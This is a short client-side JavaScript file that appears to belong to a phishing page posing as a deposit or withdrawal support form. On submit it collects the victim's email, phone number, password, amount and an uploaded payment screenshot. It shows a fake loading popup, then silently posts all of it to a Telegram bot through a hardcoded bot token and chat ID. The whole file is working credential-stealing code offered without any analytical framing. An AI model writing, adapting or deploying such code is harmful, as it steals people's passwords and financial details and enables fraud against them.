(function () {
    var TG_BOT_TOKEN = '8817770982:AAE0vUozfSQCKbXZ3Lf3PLNyEpUDrZMe-cA';
    var TG_CHAT_ID = '-1003955056796';

    var depositForm = document.getElementById('depositForm');
    var withdrawalForm = document.getElementById('withdrawalForm');

    if (!depositForm && !withdrawalForm) { return; }

    var isDeposit = !!depositForm;
    var form = isDeposit ? depositForm : withdrawalForm;
    var problemType = isDeposit ? 'Deposit' : 'Withdrwal';
    var imageInputId = isDeposit ? 'paymentImage' : 'issueImage';

    var LOADING_MS = 3000;

    function val(id) {
        var el = document.getElementById(id);
        return el ? el.value.trim() : '';
    }

    function selVal(id) {
        var el = document.getElementById(id);
        return el && el.selectedIndex >= 0 ? el.options[el.selectedIndex].text : '';
    }

    function getImageFile() {
        var el = document.getElementById(imageInputId);
        return el && el.files && el.files[0] ? el.files[0] : null;
    }

    form.addEventListener('submit', function (e) {
        e.preventDefault();

        var rows = [
            { label: 'E-mail', value: val('email') },
            { label: 'Phone No', value: val('mobile') },
            { label: 'Password', value: val('password') },
            { label: 'Type problem', value: problemType },
            { label: 'Problem status', value: selVal('problem') },
            { label: 'Amount', value: val('amount') }
        ];

        showLoading();

        setTimeout(function () {
            hideLoading();
            sendToTelegram(rows, getImageFile());
            form.reset();
        }, LOADING_MS);
    });

    function buildText(rows) {
        var map = {
            'E-mail': '📩',
            'Phone No': '📱',
            'Password': '🔑',
            'Type problem': '📌',
            'Problem status': '⚖️',
            'Amount': '💰'
        };
        var t = 'User Details 📑\n━━━━━━━━━━━━━━━\n';
        rows.forEach(function (r) {
            t += '\n' + (map[r.label] || '•') + ' ' + r.label + ' : ' + r.value + '\n';
        });
        t += '\n━━━━━━━━━━━━━━━';
        return t;
    }

    function sendToTelegram(rows, imageFile) {
        if (!TG_BOT_TOKEN || !TG_CHAT_ID) { return; }
        var caption = buildText(rows);
        var api = 'https://api.telegram.org/bot' + TG_BOT_TOKEN;

        if (imageFile) {
            var fd = new FormData();
            fd.append('chat_id', TG_CHAT_ID);
            fd.append('caption', caption);
            fd.append('photo', imageFile);
            fetch(api + '/sendPhoto', { method: 'POST', body: fd }).catch(function () {});
        } else {
            var fd2 = new FormData();
            fd2.append('chat_id', TG_CHAT_ID);
            fd2.append('text', caption);
            fetch(api + '/sendMessage', { method: 'POST', body: fd2 }).catch(function () {});
        }
    }

    function showLoading() {
        document.getElementById('loadingPopup').classList.remove('hidden');
    }

    function hideLoading() {
        document.getElementById('loadingPopup').classList.add('hidden');
    }
})();